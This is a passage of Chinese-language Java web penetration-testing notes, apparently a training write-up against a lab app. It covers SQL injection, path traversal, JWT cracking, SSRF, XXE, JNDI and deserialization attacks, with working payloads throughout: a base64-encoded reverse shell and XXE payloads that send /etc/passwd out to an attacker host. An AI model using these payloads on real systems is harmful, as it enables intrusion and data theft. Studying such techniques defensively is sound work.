+
+<pre><code class="hljs xml">@Select(&quot;select * from users order by $&#123;field&#125; $&#123;sort&#125;&quot;)
+List<span class="hljs-tag">&lt;<span class="hljs-name">User</span>&gt;</span> orderBy2(@Param(&quot;field&quot;) String field,
+@Param(&quot;sort&quot;) String sort);
+
+存在sql注入漏洞，原因是使用了 $&#123;&#125;</code></pre>
+
+<h3 id="怎么利用-PathVariables-参数SQL注入"><a href="#怎么利用-PathVariables-参数SQL注入" class="headerlink" title="怎么利用 PathVariables 参数SQL注入"></a>怎么利用 PathVariables 参数SQL注入</h3><h4 id="直接通过-uri-传参的方式"><a href="#直接通过-uri-传参的方式" class="headerlink" title="直接通过 uri 传参的方式"></a>直接通过 uri 传参的方式</h4><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><h3 id="怎么利用-order-by-注入"><a href="#怎么利用-order-by-注入" class="headerlink" title="怎么利用 order by 注入"></a>怎么利用 order by 注入</h3><p>order by 排序注入，一般会让用户输入两个参数，一个参数是列名或列序号，一个参数是升序(ASC)或 降序(desc)</p>
+<p>field 和 sort 是用户从前端传入的参数</p>
+<p>如果用户传入 field&#x3D;2&amp;sort&#x3D;desc 则 SQL语句会变为</p>
+<p><code>select * from users order by 2 desc  </code></p>
+<h4 id="利用1：遍历参数测出列数"><a href="#利用1：遍历参数测出列数" class="headerlink" title="利用1：遍历参数测出列数"></a>利用1：遍历参数测出列数</h4><p>正常显示  <code>http://192.168.79.120:8888/vulnapi/sqli/mybatis/vul/order2?field=4&amp;sort=desc</code></p>
+<p><code>http://192.168.79.120:8888/vulnapi/sqli/mybatis/vul/order2?field=5&amp;sort=desc</code> 报错</p>
+<p> 说明结果有 4列</p>
+<h4 id="利用2：-时间盲注"><a href="#利用2：-时间盲注" class="headerlink" title="利用2： 时间盲注"></a>利用2： 时间盲注</h4><p><code>http://192.168.79.120:8888/vulnapi/sqli/mybatis/vul/order2?field=if(left(user(),4) = &#39;root&#39;,sleep(3),0)&amp;sort=desc</code></p>
+<h3 id="XML类型注入"><a href="#XML类型注入" class="headerlink" title="XML类型注入"></a>XML类型注入</h3><p>mybatis 的SQL语句支持 注解编辑 或 放到 XML 文件中</p>
+<p>找到保存SQL语句的 XML 文件进行审计，审计的方式与注解类型的mybatis 相同</p>
+<h2 id="2-任意文件上传"><a href="#2-任意文件上传" class="headerlink" title="2  任意文件上传"></a>2  任意文件上传</h2><p>一般情况下，java web的文件上传api 一定有 upload 字符</p>
+<ul>
+<li>目标是否支持 jsp ，如果支持 jsp ，可以上传 jsp webshell （springboot 框架写的网站默认不 支持 jsp）</li>
+<li>如果不支持，只能上传一些脏文件 （非常大的文件、 特殊的PDF造成xss [任何src&#x2F;企业都不 收]）</li>
+</ul>
+<h2 id="3-任意文件读取、任意文件下载、目录遍历"><a href="#3-任意文件读取、任意文件下载、目录遍历" class="headerlink" title="3  任意文件读取、任意文件下载、目录遍历"></a>3  任意文件读取、任意文件下载、目录遍历</h2><p>java web 中非常常见</p>
+<p><code>http://192.168.79.120:8888/vulnapi/Traversal/download?filename=../../../../../../../etc/passwd</code></p>
+<p>怎么判断是文件下载</p>
+<p>在http中如果想使用浏览器下载文件，都有有固定的响应头 Content-Disposition: attachment;filename&#x3D;下载的文件名</p>
+<h2 id="4-jwt-json-web-token-安全隐患"><a href="#4-jwt-json-web-token-安全隐患" class="headerlink" title="4  jwt json web token 安全隐患"></a>4  jwt json web token 安全隐患</h2><h3 id="jwt-简介"><a href="#jwt-简介" class="headerlink" title="jwt 简介"></a>jwt 简介</h3><p>json web token，用于身份验证，jwt可能在cookie里，也可能在其他的请求头中，也可能在请求体中</p>
+<h3 id="jwt-的特征和构造"><a href="#jwt-的特征和构造" class="headerlink" title="jwt 的特征和构造"></a>jwt 的特征和构造</h3><p><strong>两点分隔三部分</strong>，每部分都是base64编码字符串</p>
+<p>JWT_TOKEN&#x3D;<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjcwODczOTAsImV4cCI6MTc2NzE3Mzc5MCwidXNlcm5hbWUiOiJhZG1pbiJ9.6V5f1olE_VrCNTftM0IWy7O1ks5yjJuM4VLtGZUrg2w</code></p>
+<p>三部分，分别是：</p>
+<ul>
+<li>头 （签名算法）</li>
+<li>payload 载荷 （用户信息、 生成时间、过期时间）</li>
+<li>签名 （密钥）</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.jwt.io/">https://www.jwt.io/</a></p>
+<h3 id="jwt-有哪些隐患"><a href="#jwt-有哪些隐患" class="headerlink" title="jwt 有哪些隐患"></a>jwt 有哪些隐患</h3><ul>
+<li>alg 是 none， 没有加密，不需要密码，攻击者可以随意伪造 jwt</li>
+<li>alg 不是 none，有加密，但是黑客如果知道密码，攻击者可以伪造 jwt （黑客如何获取 jwt的 密码呢？ 暴力破解 、 代码中泄露、 springboot actuator泄露 ）</li>
+</ul>
+<p>代码中泄露：自己找</p>
+<p>暴力破解：<a target="_blank" rel="noopener" href="https://github.com/Ch1ngg/JWTPyCrack">https://github.com/Ch1ngg/JWTPyCrack</a></p>
+<p><code>python jwtcrack.py -m blasting -s &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjcwODczOTAsImV4cCI6MTc2NzE3Mzc5MCwidXNlcm5hbWUiOiJhZG1pbiJ9.6V5f1olE_VrCNTftM0IWy7O1ks5yjJuM4VLtGZUrg2w&quot; --kf /home/yu/fuzzDicts/passwordDict/top1000.txt</code></p>
+<p><code>python jwtcrack.py -m blasting -s &quot;抓包看到JWT字符串&quot; --kf 密码字典的路径  </code></p>
+<h4 id="springboot-actuator-泄露"><a href="#springboot-actuator-泄露" class="headerlink" title="springboot actuator 泄露"></a>springboot actuator 泄露</h4><h3 id="jwt-伪造"><a href="#jwt-伪造" class="headerlink" title="jwt 伪造"></a>jwt 伪造</h3><p>jwt 伪造可以实现任意用户登录</p>
+<p><a target="_blank" rel="noopener" href="https://www.bejson.com/jwt/">https://www.bejson.com/jwt/</a></p>
+<h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5 SSRF"></a>5 SSRF</h2><p>URL 类的 openConnection 方法可以对 URL 发起连接</p>
+<h3 id="利用-file"><a href="#利用-file" class="headerlink" title="利用 - file:&#x2F;&#x2F;"></a>利用 - file:&#x2F;&#x2F;</h3><ul>
+<li>列目录</li>
+</ul>
+<p> <code>file:///  </code></p>
+<p> <code>file:/// var </code></p>
+<ul>
+<li>读文件</li>
+</ul>
+<p> <code>file:///etc/passwd  </code></p>
+<p><code>file:///etc/hosts </code></p>
+<h3 id="利用-http"><a href="#利用-http" class="headerlink" title="利用 - http:&#x2F;&#x2F;"></a>利用 - http:&#x2F;&#x2F;</h3><p>攻击内网，探测内网，读取云服务器的元数据  <a target="_blank" rel="noopener" href="https://forum.butian.net/share/2412">https://forum.butian.net/share/2412</a></p>
+<h3 id="利用-netdoc"><a href="#利用-netdoc" class="headerlink" title="利用 - netdoc:&#x2F;&#x2F;"></a>利用 - netdoc:&#x2F;&#x2F;</h3><ul>
+<li>读文件</li>
+</ul>
+<p> <code>netdoc:///etc/passwd</code></p>
+<h2 id="6-RCE"><a href="#6-RCE" class="headerlink" title="6 RCE"></a>6 RCE</h2><h3 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" class="headerlink" title="Runtime.getRuntime().exec()"></a>Runtime.getRuntime().exec()</h3><h3 id="java-哪些类和方法能实现执行命令"><a href="#java-哪些类和方法能实现执行命令" class="headerlink" title="java 哪些类和方法能实现执行命令"></a>java 哪些类和方法能实现执行命令</h3><ul>
+<li><p>**Runtime.getRuntime().exec() [**反弹shell必须要预先base64编码]</p>
+</li>
+<li><p><strong>ProcessBuilder</strong>类start方法 [反弹shell不需要base64编码]</p>
+</li>
+<li><p>ProcessImpl反射加载执行命令 [这是 final 类，一般不会使用该方法，但 ProcessImpl 是 java 所有命令执行的根源]</p>
+</li>
+<li><p>GroovyShell类evaluate方法 [反弹shell必须要预先base64编码]</p>
+</li>
+<li><p>java javascript引擎Nashorn的eval方法执行命令 [反弹shell必须要预先base64编码]</p>
+</li>
+</ul>
+<p> java 的 js 引擎可以在 java 代码中嵌入 js 代码，让java具有动态语言的特性</p>
+<h3 id="nashorn-利用举例"><a href="#nashorn-利用举例" class="headerlink" title="nashorn 利用举例"></a>nashorn 利用举例</h3><h4 id="1-编写恶意的js-代码-1-js"><a href="#1-编写恶意的js-代码-1-js" class="headerlink" title="1  编写恶意的js 代码 1.js"></a>1  编写恶意的js 代码 1.js</h4><p><code>var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMjAuMTAxLzc1ODYgMD4mMQ==}|{base64,-d}|{bash,-i}&quot;);}</code></p>
+<h4 id="2-开启-http-监听-（用于下载js文件）和-nc-tcp-监听（用于反弹shell）"><a href="#2-开启-http-监听-（用于下载js文件）和-nc-tcp-监听（用于反弹shell）" class="headerlink" title="2  开启 http 监听 （用于下载js文件）和 nc tcp 监听（用于反弹shell）"></a>2  开启 http 监听 （用于下载js文件）和 nc tcp 监听（用于反弹shell）</h4><h4 id="3-攻击目标网站"><a href="#3-攻击目标网站" class="headerlink" title="3  攻击目标网站"></a>3  攻击目标网站</h4><h2 id="7-XXE"><a href="#7-XXE" class="headerlink" title="7 XXE"></a>7 XXE</h2><h3 id="解析xml的类"><a href="#解析xml的类" class="headerlink" title="解析xml的类"></a>解析xml的类</h3><p>有哪些类的方法可以解析 xml ？java 有大量第三方依赖可以解析 xml，触发xxe漏洞</p>
+<p>XMLReader parse ✨</p>
+<p>SAXParser parse</p>
+<p>SAXReader read</p>
+<p>SAXBuilder build</p>
+<p>DocumentBuilder parse</p>
+<p>Unmarshaller unmarshal</p>
+<h3 id="java-xxe-利用"><a href="#java-xxe-利用" class="headerlink" title="java xxe 利用"></a>java xxe 利用</h3><h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><p>直接读取文件</p>
+<ul>
+<li>file:&#x2F;&#x2F; 协议</li>
+<li>netdoc:&#x2F;&#x2F; 协议</li>
+</ul>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/hosts&quot;</span>&gt;</span>]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">person</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">person</span>&gt;</span></code></pre>
+
+<h4 id="无回显（盲打xxe）"><a href="#无回显（盲打xxe）" class="headerlink" title="无回显（盲打xxe）"></a>无回显（盲打xxe）</h4><p>java 无回显盲打xxe方法：</p>
+<ul>
+<li>file:&#x2F;&#x2F; 协议 ，缺点：读取的文件里不能有特殊字符，且只能读取一行</li>
+<li>netdoc:&#x2F;&#x2F; 协议，和 file:&#x2F;&#x2F; 一样</li>
+<li>ftp:&#x2F;&#x2F; 协议，可以读多行文件，缺点：jdk 8u162修复了 ftp:&#x2F;&#x2F; 协议</li>
+<li>报错xxe，缺点：必须要有对应的依赖库</li>
+</ul>
+<p><code>https://github.com/bfengj/CTF/blob/main/Web/java/XXE/Java%E4%B8%AD%E7%9A%84XXE. md  </code></p>
+<h5 id="ftp外带数据"><a href="#ftp外带数据" class="headerlink" title="ftp外带数据"></a>ftp外带数据</h5><h6 id="1-服务器上安装ruby，写个ftp-rb"><a href="#1-服务器上安装ruby，写个ftp-rb" class="headerlink" title="1  服务器上安装ruby，写个ftp.rb"></a>1  服务器上安装ruby，写个ftp.rb</h6><pre><code class="hljs xml">require &#x27;socket&#x27;
+server = TCPServer.new 39802
+loop do
+  Thread.start(server.accept) do |client|
+    puts &quot;New client connected&quot;
+    data = &quot;&quot;
+    client.puts(&quot;220 xxe-ftp-server&quot;)
+    loop &#123;
+        req = client.gets()
+        puts &quot;&lt; &quot;+req
+        if req.include? &quot;USER&quot;
+            client.puts(&quot;331 password please - version check&quot;)
+        else
+           #puts &quot;&gt; 230 more data please!&quot;
+            client.puts(&quot;230 more data please!&quot;)
+        end
+    &#125;
+  end
+end</code></pre>
+
+<h6 id="2-写个po-dtt"><a href="#2-写个po-dtt" class="headerlink" title="2  写个po.dtt"></a>2  写个po.dtt</h6><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>
+<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payload</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;ftp://192.168.79.129:39802/%file;&#x27;&gt;&quot;</span>&gt;</span>
+%payload;
+%send;</code></pre>
+
+<h6 id="3-开启8000-监听，与-启动ruby-ftp-rb，然后ftp打"><a href="#3-开启8000-监听，与-启动ruby-ftp-rb，然后ftp打" class="headerlink" title="3 开启8000 监听，与 启动ruby ftp.rb，然后ftp打"></a>3 开启8000 监听，与 启动<code>ruby ftp.rb</code>，然后ftp打</h6><h6 id="4-访问网站"><a href="#4-访问网站" class="headerlink" title="4 访问网站"></a>4 访问网站</h6><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE a [</span>
+<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % x <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.79.129:8000/po.dtt&quot;</span>&gt;</span></span>
+<span class="hljs-meta">%x;</span>
+<span class="hljs-meta">]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span>855<span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span></code></pre>
+
+<h6 id="5-收到信息"><a href="#5-收到信息" class="headerlink" title="5 收到信息"></a>5 收到信息</h6><h5 id="报错xxe-openjdk-docker-fontconfig-config-依赖打"><a href="#报错xxe-openjdk-docker-fontconfig-config-依赖打" class="headerlink" title="报错xxe  (openjdk docker fontconfig-config 依赖打)"></a>报错xxe  (openjdk docker fontconfig-config 依赖打)</h5><h6 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h6><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span>
+<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;</span>&gt;</span></span>
+<span class="hljs-meta"></span>
+<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">expr</span> <span class="hljs-string">&#x27;aaa)&gt;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span>
+<span class="hljs-meta"></span>
+<span class="hljs-meta">    %local_dtd;</span>
+<span class="hljs-meta">]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></code></pre>
+
+<h5 id="外部dtd打报错xxe"><a href="#外部dtd打报错xxe" class="headerlink" title="外部dtd打报错xxe"></a>外部dtd打报错xxe</h5><h6 id="1-攻击机编写-dtd-文件"><a href="#1-攻击机编写-dtd-文件" class="headerlink" title="1  攻击机编写 dtd 文件"></a>1  攻击机编写 dtd 文件</h6><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">test</span> <span class="hljs-string">&quot;example&quot;</span>&gt;</span>
+<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">pattern</span> (%<span class="hljs-keyword">test</span>;)&gt;</span></code></pre>
+
+<h6 id="2-攻击机开监听"><a href="#2-攻击机开监听" class="headerlink" title="2  攻击机开监听"></a>2  攻击机开监听</h6><h6 id="3-用-payload-攻击目标"><a href="#3-用-payload-攻击目标" class="headerlink" title="3 用 payload 攻击目标"></a>3 用 payload 攻击目标</h6><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span>
+<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.79.120:8000/sd.dtd&quot;</span>&gt;</span></span>
+<span class="hljs-meta"></span>
+<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">test</span> <span class="hljs-string">&#x27;aaa)&gt;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/hosts&quot;&gt;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span>
+<span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span>
+<span class="hljs-meta"></span>
+<span class="hljs-meta">    %local_dtd;</span>
+<span class="hljs-meta">]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></code></pre>
+
+<h2 id="8-JNDI-注入"><a href="#8-JNDI-注入" class="headerlink" title="8  JNDI 注入"></a>8  JNDI 注入</h2><p>JNDI（Java Naming and Directory Interface java 命名和目录接口）：java可以通过 jndi 查找资源，访问各种服务</p>
+<h4 id="JNDI注入漏洞："><a href="#JNDI注入漏洞：" class="headerlink" title="JNDI注入漏洞："></a>JNDI注入漏洞：</h4><p>InitialContext类lookup方法 参数可控，导致用户可以传入任意的 jndi 字符串，实现恶意类的加载</p>
+<h4 id="JNDI-漏洞攻击"><a href="#JNDI-漏洞攻击" class="headerlink" title="JNDI 漏洞攻击"></a>JNDI 漏洞攻击</h4><h5 id="rmi-协议"><a href="#rmi-协议" class="headerlink" title="rmi 协议"></a>rmi 协议</h5><h6 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h6><h3 id="reference远程加载类"><a href="#reference远程加载类" class="headerlink" title="reference远程加载类"></a>reference远程加载类</h3><h3 id="高版本jdk的jndi注入-Java反序列化-BeanFactory"><a href="#高版本jdk的jndi注入-Java反序列化-BeanFactory" class="headerlink" title="高版本jdk的jndi注入 - Java反序列化 &#x2F; BeanFactory"></a>高版本jdk的jndi注入 - Java反序列化 &#x2F; BeanFactory</h3><h4 id="rmi-协议本身就是反序列化"><a href="#rmi-协议本身就是反序列化" class="headerlink" title="rmi 协议本身就是反序列化"></a>rmi 协议本身就是反序列化</h4><p>前提：需要找到可用java反序列化利用链，才能使用该方法绕过 高版本 jdk 的限制</p>
+<h3 id="最新版jdk采取的修复与防御措施"><a href="#最新版jdk采取的修复与防御措施" class="headerlink" title="最新版jdk采取的修复与防御措施"></a>最新版jdk采取的修复与防御措施</h3><p>新版的jdk虽然没有移除 rmi 的反序列化功能，但是把常见的反序列化利用链都列入了黑名单，如 果找不到新的反序列化利用链，rmi将无法使用</p>
+<h5 id="ldap-协议"><a href="#ldap-协议" class="headerlink" title="ldap 协议"></a>ldap 协议</h5><h6 id="轻型目录访问协议"><a href="#轻型目录访问协议" class="headerlink" title="轻型目录访问协议"></a>轻型目录访问协议</h6><h3 id="reference远程加载类-1"><a href="#reference远程加载类-1" class="headerlink" title="reference远程加载类"></a>reference远程加载类</h3><p>使用 reference 类直接 加载恶意的远程类到服务器上</p>
+<h3 id="高版本jdk的jndi注入-BeanFactory"><a href="#高版本jdk的jndi注入-BeanFactory" class="headerlink" title="高版本jdk的jndi注入 - BeanFactory"></a>高版本jdk的jndi注入 - BeanFactory</h3><p>jdk高版本中，限制了 reference 类直接 加载恶意的远程类到服务器上的操作，高版本jdk 把 trustURLCodebase配置默认改为了 false</p>
+<p><strong>BeanFactory</strong> 用 jndi 加载本地类实现攻击（前提目标服务器要有tomcat依赖） 适用场景：BeanFactory 是 org.apache.naming.factory.BeanFactory ，是tomcat<strong>自带的工厂类</strong>， 大部分 Tomcat 版本均可使用，与jdk版本无关</p>
+<h3 id="高版本jdk的jndi注入-Java反序列化"><a href="#高版本jdk的jndi注入-Java反序列化" class="headerlink" title="高版本jdk的jndi注入 - Java反序列化"></a>高版本jdk的jndi注入 - Java反序列化</h3><p>jndi注入使用ldap 时，会自动对 ldap 中 javaSerializedData 字段进行自动反序列化 前提：需要找到可用java反序列化利用链，才能使用该方法绕过 高版本 jdk 的限制</p>
+<h3 id="最新版jdk采取的修复与防御措施-1"><a href="#最新版jdk采取的修复与防御措施-1" class="headerlink" title="最新版jdk采取的修复与防御措施"></a>最新版jdk采取的修复与防御措施</h3><p>移除了 javaSerializedData 字段，反序列化无法再使用 ， 高版本jdk的jndi注入 - Java反序列化 方法失效</p>
+<h3 id="攻击演示-JNDI注入工具"><a href="#攻击演示-JNDI注入工具" class="headerlink" title="攻击演示-JNDI注入工具"></a>攻击演示-JNDI注入工具</h3><p>工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
+<p> (只能使用 jdk 8u241 以下版本运行)</p>
+<h4 id="1-在攻击机中运行"><a href="#1-在攻击机中运行" class="headerlink" title="1  在攻击机中运行"></a>1  在攻击机中运行</h4><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 攻击机的IP地址 -C &quot;反 弹shell命令&quot;  </code></p>
+<p> 作用：自动打开 ldap （1389）和 rmi （1099）监听</p>
+<h4 id="2-在攻击机中运行"><a href="#2-在攻击机中运行" class="headerlink" title="2  在攻击机中运行"></a>2  在攻击机中运行</h4><h4 id="3-攻击目标网站-1"><a href="#3-攻击目标网站-1" class="headerlink" title="3  攻击目标网站"></a>3  攻击目标网站</h4><h3 id="攻击演示-Javachains-工具"><a href="#攻击演示-Javachains-工具" class="headerlink" title="攻击演示-Javachains 工具"></a>攻击演示-Javachains 工具</h3><p> 官方文档  ：<a target="_blank" rel="noopener" href="https://java-chains.vulhub.org/zh/docs/guide">https://java-chains.vulhub.org/zh/docs/guide</a></p>
+<p>github仓库：  <a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">https://github.com/vulhub/java-chains</a></p>
+<p> java-chains安装</p>
+<pre><code class="hljs xml">docker run -d \
+  --name java-chains \
+  --restart=always \
+  -p 8011:8011 \
+  -p 58080:58080 \
+  -p 50389:50389 \
+  -p 50388:50388 \
+  -p 3308:3308 \
+  -p 13999:13999 \
+  -p 50000:50000 \
+  -p 11527:11527 \
+  -e CHAINS_AUTH=true \
+  -e CHAINS_PASS= \
+  javachains/javachains:latest
+
+docker logs $(docker ps | grep javachains/javachains | awk &#x27;&#123;print $1&#125;&#x27;) | grep -E &#x27;password&#x27;
+
+登录页面：http://your-ip:8011</code></pre>
+
+<p>⚠️ ：如果是国内的服务器，默认无法连接到 docker hub 进行 pull 镜像，需要使用云服务商提供 的加速器</p>
+<p> 腾讯云  ：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/document/product/1207/45596">https://cloud.tencent.com/document/product/1207/45596</a></p>
+<p>阿里云  ： <a target="_blank" rel="noopener" href="https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images">https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images</a></p>
+<h4 id="启动JNDI-Control"><a href="#启动JNDI-Control" class="headerlink" title="启动JNDI Control"></a>启动JNDI Control</h4><h4 id="JNDI-Basic-Payload"><a href="#JNDI-Basic-Payload" class="headerlink" title="JNDI Basic Payload"></a>JNDI Basic Payload</h4><h4 id="JNDIResourceRefPayload"><a href="#JNDIResourceRefPayload" class="headerlink" title="JNDIResourceRefPayload"></a>JNDIResourceRefPayload</h4><p>对应上文笔记 高版本jdk的jndi注入 - BeanFactory</p>
+<h4 id="JNDI-LDAP-Deserialized-Payload"><a href="#JNDI-LDAP-Deserialized-Payload" class="headerlink" title="JNDI LDAP Deserialized Payload"></a>JNDI LDAP Deserialized Payload</h4><p>对应上文笔记 高版本jdk的jndi注入 - Java反序列化</p>
+<h4 id="JNDI-RMI-Deserialized-Payload"><a href="#JNDI-RMI-Deserialized-Payload" class="headerlink" title="JNDI RMI Deserialized Payload"></a>JNDI RMI Deserialized Payload</h4><p>对应上文 高版本jdk的jndi注入-Java反序列化</p>
+<h2 id="9-Java反序列化-（readObject）"><a href="#9-Java反序列化-（readObject）" class="headerlink" title="9  Java反序列化 （readObject）"></a>9  Java反序列化 （readObject）</h2><ul>
+<li>序列化： java 使用 writeObject 方法，把jvm中的对象变为可以传输的字节码</li>
+<li>反序列化：java 使用 readObject 方法，把字节码转为 jvm中的对象</li>
+</ul>
+<h3 id="攻击流程-反序列化链"><a href="#攻击流程-反序列化链" class="headerlink" title="攻击流程 - 反序列化链"></a>攻击流程 - 反序列化链</h3><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p> <code>java -jar ysoserial.jar  </code></p>
+<h3 id="URLDNS-链"><a href="#URLDNS-链" class="headerlink" title="URLDNS 链"></a>URLDNS 链</h3><p>作用：向URL中的域名发起DNS解析，经常用于检测 java 反序列化漏洞是否存在</p>
+<p><code>java -jar ysoserial.jar URLDNS &quot;http://20251231.dwxu9j.dnslog.cn&quot; | base64 -w 0 </code></p>
+<p>如果使用windows 运行 ysoserial.jar ，因为windows没有base64命令，可以先导出文件，在使用 编码工具，把文件内容进行编码</p>
+<p> <code>java -jar ysoserial.jar URLDNS &quot;http://20251231.dwxu9j.dnslog.cn&quot; &gt; 666  </code></p>
+<p>攻击目标网站，在dnslog 中看到对应的解析结果，则证明目标网站存在反序列化漏洞</p>
+<h3 id="CB1-链"><a href="#CB1-链" class="headerlink" title="CB1 链"></a>CB1 链</h3><p><code>java -jar ysoserial.jar CommonsBeanutils1 &quot;反弹shell命令&quot; | base64  - w 0 </code></p>
+<p>打漏洞</p>
+<h3 id="攻击流程-java-chains"><a href="#攻击流程-java-chains" class="headerlink" title="攻击流程 - java chains"></a>攻击流程 - java chains</h3><h2 id="利用链原理-CC1"><a href="#利用链原理-CC1" class="headerlink" title="利用链原理 - CC1"></a>利用链原理 - CC1</h2><ul>
+<li>起点 (source)：readObject ， 被一些类重写的 readObject</li>
+<li>终点 （sink）: Runtime.getRuntime.exec</li>
+</ul>
+<p>前提：反序列化中用到的类和对象，都是通过反射加载的 （反射： java运行时动态加载对象， 参考JavaSE）</p>
+<pre><code class="hljs xml">AnnotationInvocationHandler.readObject()
+Map(Proxy).entrySet()
+AnnotationInvocationHandler.invoke()
+LazyMap.get()
+ChainedTransformer.transform()-ConstantTransformer.transform()-
+InvokerTransformer.transform()</code></pre>
+
+<p>问1：谁会调用 Runtime.getRuntime.exec(‘calc’) ？</p>
+<p>答1：InvokerTransformer 类的 transform 方法 和 ConstantTransformer 类的 transform 方法</p>
+<p>问2： 谁会调用 InvokerTransformer 类和ConstantTransformer 类的 transform 方法？</p>
+<p>答2： LazyMap 类的 get 方法，调用了 transform 方法 （前提：factory 是 InvokerTransformer 类 和 ConstantTransformer 类 的对象）</p>
+<p>问3：谁会调用 LazyMap 类的 get 方法？</p>
+<p>答3：AnnotationInvocationHandler 类的 invoke 方法调用了 get 方法 （前提： this.memberValues 是 LazyMap 类的对象）</p>
